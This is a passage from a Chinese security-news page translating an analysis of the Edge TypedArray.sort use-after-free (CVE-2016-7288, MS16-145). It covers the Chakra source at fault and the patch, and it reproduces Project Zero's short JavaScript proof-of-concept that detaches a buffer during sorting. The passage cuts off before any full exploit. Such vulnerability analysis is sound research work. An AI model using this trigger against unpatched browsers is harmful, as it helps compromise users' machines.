<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【漏洞分析】MS16-145：Edge浏览器TypedArray.sort UAF漏洞分析 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="MS16-145,Edge漏洞,TypedArray.sort,UAF,释放重引用"/>
    
        <meta name="description" content="本篇文章中，我们将为读者详细分析如何利用MS Edge浏览器中的UAF漏洞来远程执行代码。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【漏洞分析】MS16-145：Edge浏览器TypedArray.sort UAF漏洞分析</h2>
                <div class="article-msg">
                    <span class="time">2017-05-08 09:59:12</span>
                    
                                        <span class="read">阅读：10542次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3816"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3816" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="http://blog.quarkslab.com/exploiting-ms16-145-ms-edge-typedarraysort-use-after-free-cve-2016-7288.html"
                             target="_blank">来源： quarkslab.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2522399780" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2522399780" style="color:#848e99;">shan66</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p0.qhimg.com/t0167c7b41827b8d150.png" title="t012391c72a1e0f811d.png" alt="http://p7.qhimg.com/t012391c72a1e0f811d.png"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2522399780" target="_blank" textvalue="shan66"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><strong>shan66</strong></span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; word-break: break-all; text-indent: 2em; background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><span style="font-size: 18px;">预估稿费：300RMB</span></span></strong></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在这篇文章中，我们将为读者详细分析如何利用MS Edge浏览器中的UAF漏洞来远程执行代码。</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本文将为读者深入分析影响MS Edge的CVE-2016-7288 UAF漏洞的根本原因，以及如何可靠地触发该UAF漏洞，如何用一种精确地方法来左右Quicksort从而控制交换操作并破坏内存，获得相对内存读/写原语，然后在WebGL的帮助下将其转换为绝对R / W原语，最后使用伪造的面向对象编程（COOP）技术来绕过控制流保护措施。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">分析注解</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">本文是在Windows 10 Anniversary Update x64上使用下列版本的MS Edge执行分析工作的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">存在安全漏洞的模块：chakra.dll 11.0.14393.0&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">简介</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Google Project Zero已经公布了此漏洞的概念证明<a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=257597" target="_self" style="color: rgb(227, 108, 9); text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(227, 108, 9);"><strong>[3]</strong></span></a>，据称这是一个影响JavaScript的TypedArray.sort方法的UAF漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面是公布在Project Zero的bug跟踪器中的原始PoC：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&lt;html&gt;&lt;body&gt;&lt;script&gt;
var&nbsp;buf&nbsp;=&nbsp;new&nbsp;ArrayBuffer(&nbsp;0x10010);
var&nbsp;numbers&nbsp;=&nbsp;new&nbsp;Uint8Array(buf);
var&nbsp;first&nbsp;=&nbsp;0;
function&nbsp;v(){
&nbsp;&nbsp;alert(&quot;in&nbsp;v&quot;);
&nbsp;&nbsp;if(&nbsp;first&nbsp;==&nbsp;0){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;postMessage(&quot;test&quot;,&nbsp;&quot;http://127.0.0.1&quot;,&nbsp;[buf])
&nbsp;&nbsp;&nbsp;&nbsp;first++;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;return&nbsp;7;
}
function&nbsp;compareNumbers(a,&nbsp;b)&nbsp;{
&nbsp;&nbsp;alert(&quot;in&nbsp;func&quot;);
&nbsp;&nbsp;return&nbsp;{valueOf&nbsp;:&nbsp;v};
}
try{
&nbsp;&nbsp;&nbsp;&nbsp;numbers.sort(compareNumbers);
}catch(e){
&nbsp;&nbsp;&nbsp;&nbsp;alert(e.message);
}
&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">值得注意的是，在我的测试过程中，这个PoC根本没有触发这个漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">该漏洞的根本原因</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">根据Mozilla关于TypedArray.sort方法的文档[4]的介绍，“sort（）方法用于对类型化数组的元素进行排序，并返回类型化的数组”。这个方法有一个名为compareFunction的可选参数，该参数“指定定义排序顺序的函数”。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">JavaScript&nbsp;TypedArray.sort方法的对应的原生方法是chakra！TypedArrayBase&nbsp;::&nbsp;EntrySort，它是在lib&nbsp;/&nbsp;Runtime&nbsp;/&nbsp;Library&nbsp;/&nbsp;TypedArray.cpp中定义的。
Var&nbsp;TypedArrayBase::EntrySort(RecyclableObject*&nbsp;function,&nbsp;CallInfo&nbsp;callInfo,&nbsp;...){
&nbsp;&nbsp;&nbsp;&nbsp;[...]
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Get&nbsp;the&nbsp;elements&nbsp;comparison&nbsp;function&nbsp;for&nbsp;the&nbsp;type&nbsp;of&nbsp;this&nbsp;TypedArray
&nbsp;&nbsp;&nbsp;&nbsp;void*&nbsp;elementCompare&nbsp;=&nbsp;reinterpret_cast&lt;void*&gt;(typedArrayBase-&gt;GetCompareElementsFunction());
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Cast&nbsp;compare&nbsp;to&nbsp;the&nbsp;correct&nbsp;function&nbsp;type
&nbsp;&nbsp;&nbsp;&nbsp;int(__cdecl*elementCompareFunc)(void*,&nbsp;const&nbsp;void*,&nbsp;const&nbsp;void*)&nbsp;=&nbsp;(int(__cdecl*)(void*,&nbsp;const&nbsp;void*,&nbsp;const&nbsp;void*))elementCompare;
&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;*&nbsp;contextToPass[]&nbsp;=&nbsp;{&nbsp;typedArrayBase,&nbsp;compareFn&nbsp;};
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;We&nbsp;can&nbsp;always&nbsp;call&nbsp;qsort_s&nbsp;with&nbsp;the&nbsp;same&nbsp;arguments.&nbsp;If&nbsp;user&nbsp;compareFn&nbsp;is&nbsp;non-null,&nbsp;the&nbsp;callback&nbsp;will&nbsp;use&nbsp;it&nbsp;to&nbsp;do&nbsp;the&nbsp;comparison.
&nbsp;&nbsp;&nbsp;&nbsp;qsort_s(typedArrayBase-&gt;GetByteBuffer(),&nbsp;length,&nbsp;typedArrayBase-&gt;GetBytesPerElement(),&nbsp;elementCompareFunc,&nbsp;contextToPass);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们可以看到，它调用GetCompareElementsFunction方法来获取元素比较函数，并且在进行类型转换后，所述函数将传递给qsort_s（）[5]作为其第四个参数。根据其文档：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">qsort_s函数实现了一个快速排序算法来排序数组元素[...]。qsort_s会使用排序后的元素来覆盖这个数组。参数compare是指向用户提供的例程的指针，它比较两个数组元素并返回一个表明它们的关系的值。qsort_s在排序期间会调用一次或多次比较例程，每次调用时都会将指针传递给两个数组的元素。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里描述的qsort_s所有细节，对我们的任务都是非常重要的，这一点将在后文章体现出来。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">GetCompareElementsFunction方法是在lib&nbsp;/&nbsp;Runtime&nbsp;/&nbsp;Library&nbsp;/&nbsp;TypedArray.h中定义的，它只是返回TypedArrayCompareElementsHelper函数的地址：&nbsp;
CompareElementsFunction&nbsp;GetCompareElementsFunction()
{
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&amp;TypedArrayCompareElementsHelper&lt;TypeName&gt;;
}
本机比较函数TypedArrayCompareElementsHelper是在TypedArray.cpp中定义的，其代码如下所示：&nbsp;
template&lt;typename&nbsp;T&gt;&nbsp;int&nbsp;__cdecl&nbsp;TypedArrayCompareElementsHelper(void*&nbsp;context,&nbsp;const&nbsp;void*&nbsp;elem1,&nbsp;const&nbsp;void*&nbsp;elem2)
{
[...]
&nbsp;&nbsp;&nbsp;&nbsp;Var&nbsp;retVal&nbsp;=&nbsp;CALL_FUNCTION(compFn,&nbsp;CallInfo(CallFlags_Value,&nbsp;3),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JavascriptNumber::ToVarWithCheck((double)x,&nbsp;scriptContext),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JavascriptNumber::ToVarWithCheck((double)y,&nbsp;scriptContext));
&nbsp;&nbsp;&nbsp;&nbsp;Assert(TypedArrayBase::Is(contextArray[0]));
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(TypedArrayBase::IsDetachedTypedArray(contextArray[0]))
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JavascriptError::ThrowTypeError(scriptContext,&nbsp;JSERR_DetachedTypedArray,&nbsp;_u(&quot;[TypedArray].prototype.sort&quot;));
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(TaggedInt::Is(retVal))
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;TaggedInt::ToInt32(retVal);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(JavascriptNumber::Is_NoTaggedIntCheck(retVal))
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dblResult&nbsp;=&nbsp;JavascriptNumber::GetValue(retVal);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dblResult&nbsp;=&nbsp;JavascriptConversion::ToNumber_Full(retVal,&nbsp;scriptContext);
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">CALL_FUNCTION宏将调用我们的JS比较函数。请注意，在调用我们的JS函数后，代码会检查用户控制的JS代码是否已经分离了类型化的数组。但是，如Natalie Silvanovich所解释的那样，“函数的返回值被转换为一个可以调用valueOf的整数，如果这个函数分离了TypedArray，那么在释放缓冲区之后就会执行一个交换。在从TypedArrayCompareElementsHelper返回后，释放缓冲区中的元素交换操作发生在msvcrt！qsort_s中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个漏洞的修复程序只是在上面显示的代码之后对类型化数组的可能分离状态进行了额外的检查：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">//&nbsp;ToNumber&nbsp;may&nbsp;execute&nbsp;user-code&nbsp;which&nbsp;can&nbsp;cause&nbsp;the&nbsp;array&nbsp;to&nbsp;become&nbsp;detached
if&nbsp;(TypedArrayBase::IsDetachedTypedArray(contextArray[0]))
{
&nbsp;&nbsp;&nbsp;&nbsp;JavascriptError::ThrowTypeError(scriptContext,&nbsp;JSERR_DetachedTypedArray,&nbsp;_u(&quot;[TypedArray].prototype.sort&quot;));
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Project Zero的概念证明</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Project Zero提供的PoC看起来很简单：它创建了一个由ArrayBuffer对象支持的类型化数组（更具体地说是一个Uint8Array），它在类型化数组上调用sort方法，作为参数传递一个名为compareNumbers的JS函数。这个比较函数返回实现自定义valueOf方法的新对象：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">function&nbsp;compareNumbers(a,&nbsp;b)&nbsp;{
&nbsp;&nbsp;alert(&quot;in&nbsp;func&quot;);
&nbsp;&nbsp;return&nbsp;{valueOf&nbsp;:&nbsp;v};
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">v是一个函数，它通过调用postMessage方法来将ArrayBuffer分解为类型化的数组对象。在尝试把比较函数的返回值转换为整数过程中，会在从TypedArrayCompareElementsHelper调用JavascriptConversion :: ToNumber_Full（）时调用它。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">function&nbsp;v(){
&nbsp;&nbsp;alert(&quot;in&nbsp;v&quot;);
&nbsp;&nbsp;if(&nbsp;first&nbsp;==&nbsp;0){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;postMessage(&quot;test&quot;,&nbsp;&quot;http://127.0.0.1&quot;,&nbsp;[buf])
&nbsp;&nbsp;&nbsp;&nbsp;first++;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;return&nbsp;7;
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这应该足以触发这个漏洞了。然而，在多次运行PoC之后，我很惊讶地发现，它并没有在存在该漏洞的机器上面造成任何崩溃。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">以可靠的方式触发漏洞</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">过去，我编写过影响Internet Explorer类似UAF漏洞的利用代码，这也涉及到将ArrayBuffer分解为类型化数组对象。根据我对IE的经验，当通过postMessage对ArrayBuffer进行排序时，会立即释放ArrayBuffer的原始内存，因此UAF漏洞的迹象是显而易见的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在调试Edge内容进程一段时间之后，我意识到ArrayBuffer对象的原始内存没有被立即释放，而是在几秒之后，类似于“延迟释放”的方式。这导致该漏洞难以显示，因为qsort_s中的元素交换操作未触发未映射的内存。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过查看Chakra JS引擎的源代码，可以看到使用ArrayBuffer时，在lib / Runtime / Library / ArrayBuffer.cpp中的JavascriptArrayBuffer :: CreateDetachedState方法中创建了一个Js :: ArrayBuffer :: ArrayBufferDetachedState对象。在“阉割”ArrayBuffer之后会立即出现这种情况。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">ArrayBufferDetachedStateBase*&nbsp;JavascriptArrayBuffer::CreateDetachedState(BYTE*&nbsp;buffer,&nbsp;uint32&nbsp;bufferLength)
{
#if&nbsp;_WIN64
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(IsValidVirtualBufferLength(bufferLength))
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;HeapNew(ArrayBufferDetachedState&lt;FreeFn&gt;,&nbsp;buffer,&nbsp;bufferLength,&nbsp;FreeMemAlloc,&nbsp;ArrayBufferAllocationType::MemAlloc);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;HeapNew(ArrayBufferDetachedState&lt;FreeFn&gt;,&nbsp;buffer,&nbsp;bufferLength,&nbsp;free,&nbsp;ArrayBufferAllocationType::Heap);
&nbsp;&nbsp;&nbsp;&nbsp;}
#else
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;HeapNew(ArrayBufferDetachedState&lt;FreeFn&gt;,&nbsp;buffer,&nbsp;bufferLength,&nbsp;free,&nbsp;ArrayBufferAllocationType::Heap);
#endif
